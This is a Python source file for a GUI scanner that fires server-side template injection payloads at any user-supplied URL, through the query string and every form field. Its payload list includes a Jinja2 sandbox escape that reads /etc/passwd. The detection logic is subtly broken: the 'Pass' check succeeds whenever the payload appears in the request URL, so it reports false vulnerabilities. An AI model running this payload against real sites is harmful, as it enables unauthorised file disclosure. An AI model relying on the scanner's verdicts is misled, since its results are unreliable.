import argparse
import requests
import logging
from bs4 import BeautifulSoup
import urllib.parse
import tkinter as tk
from tkinter import ttk, scrolledtext
import pyperclip
import re  # Adding missing import for regular expressions

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Define a list of payloads to test
payloads = [
    "{{7*'7'}}",
    "${7*7}",
    "<%= 7 * 7 %>",
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
]

def find_input_fields(url):
    # Send a GET request to the URL
    response = requests.get(url)
    
    # Parse the HTML content
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find all input fields
    input_fields = soup.find_all('input')
    
    return input_fields

def test_payload(url, payload):
    # Send a GET request with the payload
    response = requests.get(f"{url}?{urllib.parse.quote(payload)}")
    
    # Check if the payload is reflected in the URL
    if urllib.parse.quote(payload) in response.url:
        return "Pass", response.url
    else:
        return "Fail", ""

def test_ssti(url, input_fields, output_text, passed_urls):
    output_text.insert(tk.END, "Starting SSTI detection...\n")
    
    # Check if any payload is reflected in the URL
    for payload in payloads:
        result, vulnerable_url = test_payload(url, payload)
        output_text.insert(tk.END, f"Testing payload: {payload}, Result: {result}\n")
        if result == "Pass":
            output_text.insert(tk.END, f"Vulnerable URL: {vulnerable_url}\n")
            passed_urls.append(vulnerable_url)
    
    # Otherwise, test input fields
    for field in input_fields:
        output_text.insert(tk.END, f"Testing input field: {field['name']}\n")
         
        # Test each payload in the input field
        for payload in payloads:
            # Prepare payload with SSTI
            data = {field['name']: payload}
             
            # Send a POST request with the payload
            response = requests.post(url, data=data)
             
            # Check if the payload has been injected
            if re.search(r'7777777', response.text):  # Changed regex to match injected payload
                output_text.insert(tk.END, f"Potential SSTI found in input field: {field['name']}, Payload: {payload}\n")

def copy_url(url_entry):
    url = url_entry.get()
    pyperclip.copy(url)

def start_scan(url, output_text, tree, passed_urls_text):
    passed_urls = []
    # Find input fields on the webpage
    input_fields = find_input_fields(url)
    
    # Test for SSTI vulnerabilities
    test_ssti(url, input_fields, output_text, passed_urls)
    
    # Clear the tree
    for item in tree.get_children():
        tree.delete(item)
    
    # Populate treeview with results
    for payload in payloads:
        result, vulnerable_url = test_payload(url, payload)
        tree.insert('', 'end', values=(payload, result, vulnerable_url))
    
    # Update passed URLs text area
    passed_urls_text.delete('1.0', tk.END)
    for url in passed_urls:
        passed_urls_text.insert(tk.END, f"{url}\n")

def main():
    # Create main window
    window = tk.Tk()
    window.title("SSTI Vulnerability Scanner")
    window.geometry("1000x600")

    # Output text area
    output_text = scrolledtext.ScrolledText(window, width=100, height=10)
    output_text.pack()

    # URL input field
    url_label = tk.Label(window, text="Enter Target URL:")
    url_label.pack()
    url_entry = tk.Entry(window, width=70)
    url_entry.pack()

    # Copy button
    copy_button = tk.Button(window, text="Copy URL", command=lambda: copy_url(url_entry))
    copy_button.pack()

    # Go button
    go_button = tk.Button(window, text="Go", command=lambda: start_scan(url_entry.get(), output_text, tree, passed_urls_text))
    go_button.pack()

    # Passed URLs text area
    passed_urls_label = tk.Label(window, text="URLs of passed SSTI:")
    passed_urls_label.pack()
    passed_urls_text = scrolledtext.ScrolledText(window, width=100, height=5)
    passed_urls_text.pack()

    # Results treeview
    tree = ttk.Treeview(window, columns=("Payload", "Result", "Vulnerable URL"), show="headings")
    tree.heading("Payload", text="Payload")
    tree.heading("Result", text="Result")
    tree.heading("Vulnerable URL", text="Vulnerable URL")
    tree.pack()

    # Run the main event loop
    window.mainloop()

if __name__ == "__main__":
    main()
